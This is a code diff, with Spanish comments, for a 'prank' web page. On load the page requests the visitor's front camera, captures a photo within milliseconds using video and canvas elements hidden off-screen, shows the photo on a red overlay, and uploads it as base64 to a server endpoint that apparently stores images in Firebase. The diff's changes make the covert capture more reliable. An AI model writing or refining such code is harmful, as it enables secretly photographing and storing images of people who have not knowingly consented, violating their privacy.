@@ -12,12 +12,16 @@
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #000; /* Fondo inicial mientras carga */
+            background-color: #000;
         }
 
-        /* Oculta los elementos de captura */
+        /* --- CAMBIO AQUÍ --- */
+        /* Oculta los elementos de captura moviéndolos fuera de la pantalla
+           en lugar de usar 'display: none', que puede causar problemas. */
         #video, #canvas {
-            display: none; 
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
         }
 
         /* Pantalla de sorpresa */
@@ -31,10 +35,7 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            
-            /* El gradiente solicitado */
-            background: linear-gradient(180deg, #000000 0%, #8b0000 100%); /* De negro a rojo */
-            
+            background: linear-gradient(180deg, #000000 0%, #8b0000 100%);
             opacity: 0;
             transition: opacity 0.5s ease-in;
             z-index: 10;
@@ -45,21 +46,19 @@
         }
 
         #overlay.hidden {
-            display: none; /* Oculta completamente para no interferir */
+            display: none;
         }
 
-        /* La foto capturada se muestra en pantalla completa */
         #foto-capturada {
             width: 100%;
             height: 100%;
-            object-fit: cover; /* Mantiene la proporción y llena el espacio */
+            object-fit: cover;
             position: absolute;
             top: 0;
             left: 0;
             z-index: 11;
         }
 
-        /* Mensaje encima de la foto */
         #overlay h1 {
             font-family: Arial, sans-serif;
             font-size: 5vw;
@@ -81,9 +80,6 @@
 
     <script>
         // --- CONFIGURACIÓN ---
-        // ¡¡CAMBIO IMPORTANTE!!
-        // Esta es una ruta relativa porque el frontend y el backend
-        // ahora se sirven desde el mismo dominio de Vercel.
         const VERCEL_ENDPOINT_URL = "/api/guardar-imagen";
         // ---------------------
 
@@ -92,24 +88,30 @@
         const overlay = document.getElementById('overlay');
         const fotoCapturada = document.getElementById('foto-capturada');
 
-        // 1. Solicitar acceso a la cámara inmediatamente
+        // 1. Solicitar acceso a la cámara
         async function iniciarCamara() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' } // Prioriza la cámara frontal
+                    video: { facingMode: 'user' } 
                 });
                 
                 video.srcObject = stream;
                 
-                // Espera a que el video empiece a reproducirse
-                video.onloadedmetadata = () => {
-                    // Ajusta el tamaño del canvas al del video
+                // --- ¡¡CAMBIO PRINCIPAL AQUÍ!! ---
+                // Ya no usamos 'onloadedmetadata'.
+                // Usamos el evento 'playing', que GARANTIZA que hay fotogramas.
+                video.addEventListener('playing', () => {
+                    console.log("¡El video ha comenzado a reproducirse! Capturando...");
+                    
+                    // 1. Ajustar el tamaño del canvas al del video
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-
-                    // ¡Captura la foto casi instantáneamente!
-                    setTimeout(capturarFoto, 100); 
-                };
+                    
+                    // 2. Capturar la foto inmediatamente
+                    // (Podemos añadir un pequeñísimo delay por si acaso, 
+                    // pero 'playing' suele ser suficiente)
+                    setTimeout(capturarFoto, 50); // 50ms es más seguro que 0
+                });
 
             } catch (err) {
                 console.error("Error al acceder a la cámara:", err);
@@ -119,37 +121,43 @@
             }
         }
 
-        // 2. Función para tomar la foto
+        // 2. Función para tomar la foto (sin cambios)
         function capturarFoto() {
+            // Asegurarse de que el canvas tenga un contexto
             const context = canvas.getContext('2d');
-            
-            // Dibuja el frame actual del video en el canvas
+            if (!context) {
+                console.error("No se pudo obtener el contexto 2D del canvas");
+                return;
+            }
+
+            console.log("Dibujando imagen en canvas...");
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Obtiene la imagen como Data URL (Base64)
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.9); // Calidad 0.9
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
 
-            // Muestra la foto en la pantalla de "caíste"
+            // Verificación: Si el dataUrl es muy corto, algo salió mal (ej. canvas vacío)
+            if (dataUrl.length < 1000) {
+                console.warn("La imagen capturada parece estar vacía (posiblemente negra).");
+                // Podríamos intentar capturar de nuevo, pero por ahora mostremos la falla
+            }
+            
             fotoCapturada.src = dataUrl;
             mostrarPantallaBroma();
 
-            // Detiene el stream de la cámara para apagar la luz de la webcam
             video.srcObject.getTracks().forEach(track => track.stop());
 
-            // 3. Prepara y envía los datos al backend (Vercel)
             const base64Data = dataUrl.split(',')[1];
-            
             enviarAFirebase(base64Data);
         }
 
-        // 4. Muestra la pantalla de broma
+        // 4. Muestra la pantalla de broma (sin cambios)
         function mostrarPantallaBroma() {
             overlay.classList.remove('hidden');
             void overlay.offsetWidth; 
             overlay.classList.add('visible');
         }
 
-        // 5. Envía el Base64 al backend seguro en Vercel
+        // 5. Envía el Base64 al backend (sin cambios)
         async function enviarAFirebase(base64) {
             console.log("Enviando foto a Vercel...");
             try {
@@ -174,7 +182,7 @@
             }
         }
 
-        // Inicia todo el proceso al cargar la página
+        // Inicia todo el proceso
         iniciarCamara();
     </script>
 </body>
